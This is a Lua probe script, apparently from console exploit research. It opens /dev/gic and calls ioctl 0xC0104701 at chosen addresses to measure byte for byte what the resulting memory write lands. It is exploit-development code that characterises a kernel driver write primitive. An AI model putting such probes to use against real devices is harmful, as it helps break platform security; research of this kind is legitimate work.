-- CRASH_CLASS: LOW
-- PROBE 475c: the exact payload the gic command writes
--
-- Context: 475b proved 0xC0104701 writes to the address q0 names. A page
-- filled with C0FFEE00 came back as
--     00010002 41535543 39333732 C0FF0030
-- i.e. a u32 0x00010002 followed by the ASCII bytes "CUSA27390\0" (that title
-- is this console's running game), with the top half of the fourth dword left
-- untouched. This probe measures the write precisely: how many bytes land,
-- whether anything past them moves, whether a second call is idempotent, and
-- whether the payload shifts when q0 is offset within a page.

print("=== PROBE 475c: the gic payload, byte for byte ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function sgn(v)
    local h, l = 0, to_num(v)
    if type(v) == "table" and v.h then h, l = v.h, v.l end
    if h % 0x100000000 == 0xFFFFFFFF and l % 0x100000000 == 0xFFFFFFFF then return -1 end
    if h == 0 and l >= 0x80000000 then return l - 0x100000000 end
    return l
end
local function put_str(s)
    local buf = memory.alloc(#s + 1)
    for i = 1, #s do pcall(function() memory.write_byte(buf + i - 1, s:byte(i)) end) end
    pcall(function() memory.write_byte(buf + #s, 0) end)
    return buf
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return to_num(v) end
    return -1
end
local function rb(a)
    local ok, v = pcall(function() return memory.read_byte(a) end)
    if ok then return to_num(v) end
    return -1
end

local sc_open = make_syscall(5)
local sc_close = make_syscall(6)
local sc_ioctl = make_syscall(54)
local CMD = 0xC0104701

local fd = sgn(sc_open(uint64(put_str("/dev/gic")), uint64(2), uint64(0)))
print("fd=" .. fd)
if fd < 0 then
    print("=== PROBE 475c ABORTED ===")
    return
end

local arg = memory.alloc(0x40)
local target = memory.alloc(0x1000)
for off = 0, 0xFFC, 4 do wd(target + off, 0xC0FFEE00) end

local function set_q0(addr)
    for off = 0, 0x3C, 4 do wd(arg + off, 0) end
    local ok = pcall(function() memory.write_qword(arg, uint64(addr)) end)
    if ok then return true end
    local hi = math.floor(addr / 4294967296)
    local lo = addr % 4294967296
    return pcall(function() memory.write_qword(arg, uint64(string.format("0x%X%08X", hi, lo))) end)
end

local function dump_bytes(buf, n, tag)
    local parts = {}
    for i = 0, n - 1 do
        parts[#parts + 1] = string.format("%02X", rb(buf + i) % 0x100)
    end
    print(string.format("    %-8s %s", tag, table.concat(parts, " ")))
end

local function call_at(addr)
    set_q0(addr)
    return sgn(sc_ioctl(uint64(fd), uint64(CMD), uint64(arg)))
end

print(string.format("[0] arg=0x%X target=0x%X", to_num(arg), to_num(target)))

print("")
print("[A] write at target+0, 32 bytes before and after")
dump_bytes(target, 32, "before")
local r = call_at(target)
print("    ret=" .. r)
dump_bytes(target, 32, "after")

print("")
print("[B] same call again: idempotent?")
local r2 = call_at(target)
print("    ret=" .. r2)
dump_bytes(target, 32, "after2")

print("")
print("[C] write at target+0x20: does the payload land at the offset given?")
for off = 0, 0xFFC, 4 do wd(target + off, 0xC0FFEE00) end
dump_bytes(target + 0x20, 32, "before")
local r3 = call_at(target + 0x20)
print("    ret=" .. r3)
dump_bytes(target + 0x20, 32, "after")
dump_bytes(target, 32, "at base")

print("")
print("[D] unaligned q0 = target+0x03")
for off = 0, 0xFFC, 4 do wd(target + off, 0xC0FFEE00) end
local r4 = call_at(target + 3)
print("    ret=" .. r4)
dump_bytes(target, 24, "after")

pcall(function() sc_close(uint64(fd)) end)
print("")
print("=== PROBE 475c COMPLETE ===")
